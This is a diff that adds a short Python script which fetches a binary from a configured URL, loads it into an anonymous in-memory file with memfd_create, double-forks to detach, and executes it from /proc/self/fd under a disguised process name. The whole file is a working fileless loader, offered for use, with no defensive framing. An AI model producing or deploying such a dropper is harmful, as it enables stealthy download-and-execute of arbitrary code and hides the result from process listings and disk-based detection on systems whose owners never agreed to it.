@@ -1,0 +1,71 @@
+#!/usr/bin/env python3
+
+import os
+import ctypes
+import urllib.request # Using the standard library for HTTP requests
+
+# --- Configuration ---
+BINARY_URL = "http://127.0.0.1:8080/agent"
+
+# --- Linux syscall definitions via ctypes ---
+try:
+    libc = ctypes.CDLL(None)
+except OSError as e:
+    print(f"Error loading libc: {e}")
+    exit(1)
+
+# int memfd_create(const char *name, unsigned int flags);
+memfd_create = libc.memfd_create
+memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
+memfd_create.restype = ctypes.c_int
+
+def run_fileless():
+    """
+    Fetches a binary and executes it as a detached background process.
+    """
+    try:
+        with urllib.request.urlopen(BINARY_URL, timeout=10) as response:
+            if not (200 <= response.status < 300):
+                return
+            binary_content = response.read()
+    except Exception as e:
+        return
+
+    # Create the in-memory file BEFORE forking
+    fd = memfd_create(b"elf", 1)
+    if fd == -1:
+        return
+    os.write(fd, binary_content)
+
+    # --- Start Double Fork ---
+
+    # 1. First fork
+    pid = os.fork()
+    if pid > 0:
+        # Parent process: Exit immediately.
+        # This is what allows your script to not hang.
+        os._exit(0)
+
+    # Decouple from parent environment
+    os.setsid()
+
+    # Second fork
+    pid = os.fork()
+    if pid > 0:
+        # First Child process: Exit.
+        os._exit(0)
+
+    # --- Now we are in the Grandchild Process (Daemon) ---
+    try:
+        fd_path = f"/proc/self/fd/{fd}"
+        
+        # Execute the binary from the file descriptor.
+        # This replaces the grandchild process with your binary.
+        os.execl(fd_path, "process-name-in-ps") # Add args as needed
+    except OSError as e:
+        # This part will only be reached if execl fails.
+        print(f"[!] Failed to execute from memory: {e}")
+        os._exit(1)
+
+if __name__ == "__main__":
+    run_fileless()
